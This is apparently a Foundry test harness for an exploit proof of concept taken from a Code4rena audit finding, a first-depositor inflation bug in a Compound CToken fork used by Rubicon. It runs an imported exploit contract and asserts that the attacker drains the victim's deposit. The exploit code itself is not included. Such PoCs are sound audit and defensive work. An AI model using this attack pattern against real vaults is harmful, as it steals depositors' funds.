// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./48956-h-17-first-depositor-bug-on-unmodified-compound-fork-code4re.sol";

/* Rubicon H-17 — first depositor inflation on Compound CToken fork (Code4rena 2023-04) */
contract PoC_48956 is Test {
    function test_firstDepositorInflation() public {
        Exploit e = new Exploit();
        e.run();

        // Alice ends with ~300e18 (started 200e18, stole Bob's 100e18)
        assertGe(e.token().balanceOf(address(e.alice())), 299e18);
        // Bob drained
        assertEq(e.token().balanceOf(address(e.bob())), 0);
        assertEq(e.cToken().totalSupply(), 0);
    }
}
